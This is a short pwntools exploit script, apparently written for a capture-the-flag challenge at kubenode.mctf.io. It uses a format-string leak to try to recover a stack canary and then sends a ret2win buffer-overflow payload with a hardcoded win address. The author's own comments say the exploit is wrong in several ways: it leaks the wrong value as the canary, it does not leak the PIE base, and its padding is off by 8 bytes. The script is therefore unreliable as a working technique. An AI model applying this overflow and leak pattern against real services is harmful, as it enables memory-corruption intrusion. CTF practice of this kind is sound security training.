from pwn import*

conn = remote("kubenode.mctf.io", 30012)
print(conn.recv())

'''
NOTE: Mistakes:

binary -> heap -> wilderness -> stack <- other stuff


1) there is 8 bytes of padding BEFORE the return address
2) did not leak the PIE 
3) wrong canary leaked (started with 7f, stack values don't start with that)



'''

# leaking the stack we know it's there from before it ends in "00" (null byte so it's stack canary)
# NOTE: this was NOT the canary it starts with 0x7f, is that not in the stack?
overflow = b'A'*63+b"AAA%33$p"
conn.sendline(overflow)

# parsing canary from output
canary = str(conn.recv().decode().split(", that's")[0][-14:])
input(canary)

# converting to payload
canary = int(canary, 16)
canary = p64(canary)


# NOTE: this is WRONG we need PIE
print(f"{canary}")
WIN_ADDR = p64(0x00000000000011b9)

# NOTE: this is wrong we need 8 bytes of padding BEFORE we reach the RSP register on the stack!
ret2win = b"A"*72 + canary + WIN_ADDR 
conn.sendline(ret2win)

print(conn.recv())